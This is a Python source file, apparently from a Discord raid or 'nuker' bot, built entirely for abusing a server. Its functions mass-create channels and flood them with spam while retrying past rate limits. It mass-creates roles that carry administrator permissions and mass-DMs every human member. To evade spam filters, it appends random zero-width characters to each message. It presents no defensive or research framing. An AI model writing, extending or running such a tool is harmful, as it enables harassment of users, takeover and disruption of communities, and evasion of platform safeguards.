import discord
import asyncio
import random

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ WORKER CORE - BRUTE FORCE SPAM ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_stealth_text(text, premium):
    """Invisible obfuscation for premium bypass."""
    if not premium: return text
    chars = ["\u200b", "\u200c", "\u200d"]
    return f"{text}{''.join(random.choices(chars, k=3))}"

async def channel_worker(guild, name, text, index, amount, premium):
    """Specialized worker for single channel creation and spam."""
    try:
        channel = await guild.create_text_channel(f"{name}-{index+1}")
        # High-speed spam loop
        for _ in range(amount):
            try:
                await channel.send(get_stealth_text(text, premium))
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 1.0)
                else: break
            except: break
    except: pass

async def role_worker(guild, count, name):
    """Specialized worker for mass role creation."""
    tasks = [guild.create_role(name=name, permissions=discord.Permissions(administrator=True)) for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_dm_worker(guild, message, premium):
    """Specialized worker for mass DM delivery."""
    count = 0
    for member in guild.members:
        if member.bot: continue
        try:
            await member.send(get_stealth_text(message, premium))
            count += 1
            await asyncio.sleep(0.05) # Optimized delay for DM
        except: continue
    return count
  
